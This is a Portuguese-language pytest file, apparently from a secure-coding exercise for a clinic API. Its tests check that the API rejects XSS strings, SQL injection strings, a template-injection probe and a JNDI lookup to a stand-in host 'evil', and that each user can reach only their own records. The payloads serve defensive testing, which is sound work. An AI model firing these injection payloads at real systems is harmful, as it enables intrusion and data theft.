"""Exercício 9 — correções de entrada/saída: whitelist+regex, extra='forbid',
SQL parametrizado, XSS armazenado e ownership centralizado (BOLA)."""
import re
from pathlib import Path

import pytest

from database.repository import search_patients_by_name
from models.patients import Patient
from models.users import Role
from tests.helpers import PASSWORD, next_slot

ROOT = Path(__file__).resolve().parent.parent


def _new_appt(patient_id, **over):
    return {"patient_id": patient_id, "date_time": next_slot().isoformat(), "reason": "Consulta", **over}


# --------------------------- extra = 'forbid' --------------------------------
@pytest.mark.parametrize("extra", [{"professional_id": 99}, {"status": "concluida"}, {"id": 1},
                                   {"internal_audit_note": "x"}, {"created_by_user_id": 1}])
def test_criar_consulta_rejeita_campos_nao_declarados(client, make_user, make_patient, auth, extra):
    doctor = make_user(Role.profissional)
    patient = make_patient(doctor)
    r = client.post("/appointment/new", json=_new_appt(patient.id, **extra), headers=auth(doctor))
    assert r.status_code == 422
    assert any(e["type"] == "extra_forbidden" for e in r.json()["detail"])


def test_atualizar_consulta_nao_aceita_trocar_dono_ou_paciente(client, make_user, make_patient, make_appointment, auth):
    doctor, other = make_user(Role.profissional), make_user(Role.profissional)
    appt = make_appointment(doctor, make_patient(doctor))
    for extra in ({"professional_id": other.id}, {"patient_id": 5}):
        r = client.put(f"/appointment/{appt.id}", json=extra, headers=auth(doctor))
        assert r.status_code == 422


def test_signup_nao_aceita_campos_extras_e_exige_admin(client, make_user, auth):
    admin = make_user(Role.admin)
    body = {"name": "Fulano Teste", "email": "f@clinica.com.br", "password": PASSWORD, "role": "recepcionista",
            "is_superuser": True}
    assert client.post("/user/signup", json=body, headers=auth(admin)).status_code == 422


# --------------------------- whitelist / regex -------------------------------
@pytest.mark.parametrize("field,value", [
    ("reason", '<script>alert(1)</script>'),
    ("reason", "<img src=x onerror=alert(1)>"),
    ("reason", "{{7*7}}"),
    ("reason", "x"),  # curto demais
    ("notes", "'; DROP TABLE appointments; --<"),
    ("notes", "${jndi:ldap://evil}"),
])
def test_texto_livre_fora_da_whitelist_e_rejeitado(client, make_user, make_patient, auth, field, value):
    doctor = make_user(Role.profissional)
    patient = make_patient(doctor)
    r = client.post("/appointment/new", json=_new_appt(patient.id, **{field: value}), headers=auth(doctor))
    assert r.status_code == 422


def test_texto_clinico_legitimo_com_acentos_e_pontuacao_e_aceito(client, make_user, make_patient, auth):
    doctor = make_user(Role.profissional)
    patient = make_patient(doctor)
    notes = "Dor lombar há 3 dias (EVA 6/10). Prescrito: dipirona 500 mg, 6/6 h; retorno em 15 dias!"
    r = client.post("/appointment/new", json=_new_appt(patient.id, notes=notes, reason="Dor lombar - avaliação"),
                    headers=auth(doctor))
    assert r.status_code == 201, r.text


@pytest.mark.parametrize("bad_cpf", ["123.456.789-00", "111.111.111-11", "abc", "12345678901234"])
def test_cpf_invalido_e_rejeitado(client, make_user, auth, bad_cpf):
    recep, doctor = make_user(Role.recepcionista), make_user(Role.profissional)
    body = {"name": "Maria Souza", "cpf": bad_cpf, "phone": "11999998888", "professional_id": doctor.id}
    assert client.post("/patient/new", json=body, headers=auth(recep)).status_code == 422


def test_cpf_valido_e_aceito_e_armazenado_so_com_digitos(client, make_user, auth, session):
    recep, doctor = make_user(Role.recepcionista), make_user(Role.profissional)
    body = {"name": "Maria Souza", "cpf": "529.982.247-25", "phone": "11999998888", "professional_id": doctor.id}
    r = client.post("/patient/new", json=body, headers=auth(recep))
    assert r.status_code == 201, r.text
    assert r.json()["cpf"] == "***.***.***-25"
    from sqlmodel import select
    assert session.exec(select(Patient)).one().cpf == "52998224725"


def test_erro_de_validacao_nao_ecoa_o_valor_enviado(client, make_user, auth):
    """O handler padrão do FastAPI devolve "input" com a senha digitada. O nosso remove."""
    admin = make_user(Role.admin)
    secret_attempt = "curta-123"
    body = {"name": "Fulano Teste", "email": "f@clinica.com.br", "password": secret_attempt, "role": "recepcionista"}
    r = client.post("/user/signup", json=body, headers=auth(admin))
    assert r.status_code == 422
    assert secret_attempt not in r.text and "input" not in r.text


# ------------------------------ SQL injection --------------------------------
@pytest.mark.parametrize("payload", ["' OR '1'='1", "ana%", "ana_", "1; DROP TABLE users", "a' OR 1=1 --"])
def test_busca_com_payload_sql_e_barrada_pela_whitelist(client, make_user, make_patient, auth, payload):
    """Camada 1 (validação): caracteres como = ; % _ 0-9 não fazem parte da whitelist de nomes."""
    doctor = make_user(Role.profissional)
    make_patient(doctor, name="Ana Lima")
    r = client.get("/patient/search", params={"name": payload}, headers=auth(doctor))
    assert r.status_code == 422


def test_payload_que_passa_na_whitelist_e_neutralizado_pela_parametrizacao(client, make_user, make_patient, auth):
    """Camada 2 (queries parametrizadas): este payload só tem letras, espaço, ' e -, então a
    whitelist o aceita — mas ele chega ao banco como DADO e não casa com nenhum nome."""
    doctor = make_user(Role.profissional)
    make_patient(doctor, name="Ana Lima")
    r = client.get("/patient/search", params={"name": "x' UNION SELECT cpf FROM patients --"},
                   headers=auth(doctor))
    assert r.status_code == 200
    assert r.json() == []  # nada vazou; nenhum CPF na resposta
    assert "cpf" not in r.text.lower()


def test_busca_com_apostrofo_legitimo_nao_quebra_nem_vaza(client, make_user, make_patient, auth):
    doctor = make_user(Role.profissional)
    make_patient(doctor, name="Dona D'Avila")
    make_patient(doctor, name="Outra Pessoa")
    r = client.get("/patient/search", params={"name": "d'avila"}, headers=auth(doctor))
    assert r.status_code == 200
    assert [p["name"] for p in r.json()] == ["Dona D'Avila"]  # apóstrofo tratado como DADO


def test_like_escapa_curingas_mesmo_sem_a_whitelist(session, make_user, make_patient):
    """Defesa em profundidade na camada de dados: '%' e '_' não viram curingas."""
    admin, doctor = make_user(Role.admin), make_user(Role.profissional)
    make_patient(doctor, name="Ana Lima")
    make_patient(doctor, name="Ana Souza")
    assert len(search_patients_by_name(session, admin, "ana", 10, 0)) == 2
    assert search_patients_by_name(session, admin, "%", 10, 0) == []
    assert search_patients_by_name(session, admin, "a_a", 10, 0) == []


def test_login_com_payload_sql_nao_burla_autenticacao(client, make_user):
    make_user(Role.recepcionista, email="ana@clinica.com.br")
    for username in ("' OR '1'='1' --", "ana@clinica.com.br' --", "admin'/*"):
        assert client.post("/user/signin", data={"username": username, "password": "x"}).status_code == 401


def test_nenhum_codigo_monta_sql_por_concatenacao():
    """Guarda estática (complementa o Bandit B608): sem f-string/format/+ em SQL."""
    risky = [
        re.compile(r"""(?i)\b(select|insert|update|delete)\b[^\n]*\b(from|into|set|where)\b[^\n]*(\{|%s|\+\s*\w)"""),
        re.compile(r"""text\(\s*f["']"""),
        re.compile(r"""\.execute\(\s*f["']"""),
        re.compile(r"""\.execute\(\s*["'][^"']*["']\s*[%+]"""),
    ]
    offenders = []
    for folder in ("auth", "core", "database", "models", "routes"):
        for py in (ROOT / folder).rglob("*.py"):
            for n, line in enumerate(py.read_text().splitlines(), 1):
                if line.strip().startswith(("#", '"""')):
                    continue
                if any(p.search(line) for p in risky):
                    offenders.append(f"{py.relative_to(ROOT)}:{n}: {line.strip()}")
    assert not offenders, "\n".join(offenders)


# --------------------- BOLA: mesmo padrão em outros endpoints ----------------
def test_bola_em_todos_os_endpoints_por_id(client, make_user, make_patient, make_appointment, auth):
    """O ataque do Ex. 8 (trocar o ID na URL) vale para consulta E paciente — e para
    leitura, alteração e cancelamento. Todos passam pelo mesmo filtro de ownership."""
    victim, attacker = make_user(Role.profissional), make_user(Role.profissional)
    patient = make_patient(victim)
    appt = make_appointment(victim, patient, notes="Dado clínico da vítima")
    h = auth(attacker)

    assert client.get(f"/appointment/{appt.id}", headers=h).status_code == 404
    assert client.put(f"/appointment/{appt.id}", json={"notes": "adulterado"}, headers=h).status_code == 404
    assert client.delete(f"/appointment/{appt.id}", headers=h).status_code == 404
    assert client.get(f"/patient/{patient.id}", headers=h).status_code == 404  # endpoint NÃO citado no Ex. 8
    assert client.get("/patient/", headers=h).json() == []
    assert client.get("/appointment/", headers=h).json() == []
    # e a vítima continua com acesso e dados intactos
    ok = client.get(f"/appointment/{appt.id}", headers=auth(victim))
    assert ok.status_code == 200 and ok.json()["notes"] == "Dado clínico da vítima"
